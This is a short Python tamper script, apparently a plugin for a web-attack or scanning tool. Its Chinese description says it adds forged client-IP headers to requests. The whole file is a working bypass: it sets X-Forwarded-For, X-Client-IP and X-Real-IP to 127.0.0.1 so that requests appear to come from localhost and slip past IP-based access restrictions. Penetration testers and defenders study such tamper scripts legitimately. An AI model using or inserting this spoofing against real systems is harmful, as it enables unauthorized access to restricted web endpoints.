# tamper_xff_ip_bypass.py

name = "tamper_xff_ip_bypass"
description = "加入 X-Forwarded-For 等常見偽造 IP 表頭，模擬來源為內網 127.0.0.1，以繞過 IP 限制"

def tamper(data):
    headers = data.get("headers", {})
    if not isinstance(headers, dict):
        headers = {}

    # 常見繞過表頭
    headers["X-Forwarded-For"] = "127.0.0.1"
    headers["X-Client-IP"] = "127.0.0.1"
    headers["X-Real-IP"] = "127.0.0.1"

    data["headers"] = headers
    return data
